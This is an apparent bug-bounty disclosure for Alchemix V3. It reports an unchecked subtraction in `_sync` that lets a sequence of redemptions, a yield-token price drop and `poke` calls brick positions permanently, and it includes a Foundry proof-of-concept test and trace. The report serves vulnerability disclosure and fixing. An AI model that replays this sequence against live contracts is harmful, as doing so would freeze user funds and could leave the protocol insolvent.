# 58544 sc critical it is possible to underflow on sync making positions bricked forever

**Submitted on Nov 3rd 2025 at 07:06:27 UTC by @farismaulana for** [**Audit Comp | Alchemix V3**](https://immunefi.com/audit-competition/alchemix-v3-audit-competition)

* **Report ID:** #58544
* **Report Type:** Smart Contract
* **Report severity:** Critical
* **Target:** <https://github.com/alchemix-finance/v3-poc/blob/immunefi\\_audit/src/AlchemistV3.sol>
* **Impacts:**
  * Permanent freezing of funds
  * Protocol insolvency

## Description

## Brief/Intro

`account.rawLocked` is recalculated every time the `_sync` function invoked. it is crucial for the value to be updated because it is used to calculate how much collateral need to be removed every `_sync` . however there are no mechanism to make the collateral to remove from this calculation to always cap to `account.collateralBalance` . given how a combination of `poke`, `redeem` and yield token price drop would cause the collateral to remove bigger than `account.collateralBalance` leading to underflow.

## Vulnerability Details

the issue is there are no cap mechanism to prevent the `collateralToRemove` to be maxed at `account.collateralBalance`

```solidity
    function _sync(uint256 tokenId) internal {
        Account storage account = _accounts[tokenId];

        // Collateral to remove from redemptions and fees
@>      uint256 collateralToRemove = PositionDecay.ScaleByWeightDelta(account.rawLocked, _collateralWeight - account.lastCollateralWeight);
@>      account.collateralBalance -= collateralToRemove;
...
        // Update locked collateral
@>      account.rawLocked = convertDebtTokensToYield(account.debt) * minimumCollateralization / FIXED_POINT_SCALAR;
```

note that the `account.rawLocked` is recalculated at the end of `_sync`, this would cause an issue if the yield token price drop, making the `account.debt` would need more rawLocked amount than before.

but the above are not enough to be an issue. there are second parameter that affect how much `collateralToRemove`, which is `_collateralWeight` that is updated on `redeem` function.

the issue to inflate this `collateralToRemove` to be bigger than `account.collateralBalance` can be achieved by:

1. minimum two redemption position on transmuter
2. yield token price drop
3. claim matured redemption → increase system `_collateralWeight`
4. poke a tokenId → using updated `_collateralWeight` remove the collateral, recalculate `account.rawLocked` using price drop of yield token, this would result in increased rawLocked amount needed.
5. claim another matured redemption → increase system `_collateralWeight`
6. any `_sync` interaction would revert underflow because now the result of `PositionDecay.ScaleByWeightDelta(account.rawLocked, _collateralWeight - account.lastCollateralWeight` would be greater than `account.collateralBalance`

## Impact Details

there are multiple impact of this issue:

1. permanent account freezing
2. unable to recover bad debt via repay/liquidate (or any function that have `_sync` )
3. protocol insolvency, unliquidated bad debt drains value of the entire system. the debt remains and the collateral is frozen while cant be seized.
4. the positions that bricked cant be recovered even if the price of yield increase, making the issue permanent once happen

## References

<https://github.com/alchemix-finance/v3-poc/blob/a192ab313c81ba3ab621d9ca1ee000110fbdd1e9/src/AlchemistV3.sol#L1042-L1086>

<https://github.com/alchemix-finance/v3-poc/blob/a192ab313c81ba3ab621d9ca1ee000110fbdd1e9/src/AlchemistV3.sol#L634>

## Proof of Concept

## Proof of Concept

add the test to `src/test/AlchemistV3.t.sol`:

```solidity
    function test_underflowOnSync() external {
        uint256 amount = 100e18;
        uint256 mintAmount = 89e18;
        vm.startPrank(address(0xbeef));
        SafeERC20.safeApprove(address(vault), address(alchemist), type(uint256).max);
        alchemist.deposit(amount, address(0xbeef), 0);
        // a single position nft would have been minted to 0xbeef
        uint256 tokenIdFor0xBeef = AlchemistNFTHelper.getFirstTokenId(address(0xbeef), address(alchemistNFT));
        
        // mint for 0xdad so we only use the minted amount of alAsset
        alchemist.mint(tokenIdFor0xBeef, (mintAmount), address(0xdad));
        vm.stopPrank();

        vm.startPrank(address(0xdad));
        SafeERC20.safeApprove(address(alToken), address(transmuterLogic), type(uint256).max);
        // create two redemption position
        transmuterLogic.createRedemption(mintAmount/2);
        transmuterLogic.createRedemption(mintAmount/2);
        vm.stopPrank();

        // maturing the redemption and maxing the earmarked
        vm.roll(block.number + 5_256_000);

        (,, uint256 earmarked) = alchemist.getCDP(tokenIdFor0xBeef);

        assertApproxEqAbs(earmarked, mintAmount, 1);

        // yield price drop
        console.log("price", IMockYieldToken(mockStrategyYieldToken).price());
        deal(address(IMockYieldToken(mockStrategyYieldToken).underlyingToken()), address(mockStrategyYieldToken),  amount / 2);
        IMockYieldToken(mockStrategyYieldToken).updateMockTokenSupply(amount);
        console.log("price", IMockYieldToken(mockStrategyYieldToken).price());

        // claim the first redemption position
        vm.prank(address(0xdad));
        transmuterLogic.claimRedemption(1);

        // poke to update the account.rawLocked, this should be bigger than before
        // before it is 9.88e19 but because of yield price drop, by poke() the account.rawLocked recalculated = 1.422e20
        alchemist.poke(tokenIdFor0xBeef);

        // claim second redemption position, this would increase the collateral weight
        vm.prank(address(0xdad));
        transmuterLogic.claimRedemption(2);

        // yield price back to normal x 2
        // console.log("price", IMockYieldToken(mockStrategyYieldToken).price());
        // deal(address(IMockYieldToken(mockStrategyYieldToken).underlyingToken()), address(mockStrategyYieldToken), amount * 2);
        // IMockYieldToken(mockStrategyYieldToken).updateMockTokenSupply(amount);
        // console.log("price", IMockYieldToken(mockStrategyYieldToken).price());

        // when user wants to invoke anything that include _sync it would underflow
        // because account.collateralBalance < collateralToRemove
        vm.prank(address(0xbeef));
        alchemist.repay(100e18, tokenIdFor0xBeef);

    }

```

run with `forge test --mt test_underflowOnSync` and the repay call would fail of underflow.

note: we can also simulate yield price became even higher than mint time (2x price increase) by uncomment the total supply mock lines but it would not help the position that is bricked as it would still underflow.

at the end of the test, when `_sync` is invoked inside repay, the value of `collateralToRemove` is `1.422e20` while the `account.collateralBalance` is left with `5e19` .

we can log the value by creating an emit event and emit it inside the `_sync` for further analysis:

```diff
+   event Debug(uint256);
    function _sync(uint256 tokenId) internal {
        Account storage account = _accounts[tokenId];

        // Collateral to remove from redemptions and fees
+       emit Debug(account.rawLocked);
+       emit Debug(_collateralWeight);
+       emit Debug(account.lastCollateralWeight);
        uint256 collateralToRemove = PositionDecay.ScaleByWeightDelta(account.rawLocked, _collateralWeight - account.lastCollateralWeight);
+       emit Debug(collateralToRemove);
+       emit Debug(account.collateralBalance);
        account.collateralBalance -= collateralToRemove;
+       emit Debug(account.collateralBalance);
```

the trace:

```bash
    ├─ [15617] TransparentUpgradeableProxy::fallback(100000000000000000000 [1e20], 1)
    │   ├─ [14895] AlchemistV3::repay(100000000000000000000 [1e20], 1) [delegatecall]
    │   │   ├─ [1265] AlchemistV3Position::ownerOf(1) [staticcall]
    │   │   │   └─ ← [Return] 0x000000000000000000000000000000000000bEEF
    │   │   ├─ emit Debug(: 142222222222222222206 [1.422e20])
    │   │   ├─ emit Debug(: 171492080281584019692129011794975683145 [1.714e38])
    │   │   ├─ emit Debug(: 1350896821114787960441708079091577416 [1.35e36])
    │   │   ├─ emit Debug(: 142222222222222222206 [1.422e20])
    │   │   ├─ emit Debug(: 50000000000000000000 [5e19])
    │   │   └─ ← [Revert] panic: arithmetic underflow or overflow (0x11)
    │   └─ ← [Revert] panic: arithmetic underflow or overflow (0x11)
    └─ ← [Revert] panic: arithmetic underflow or overflow (0x11)
```
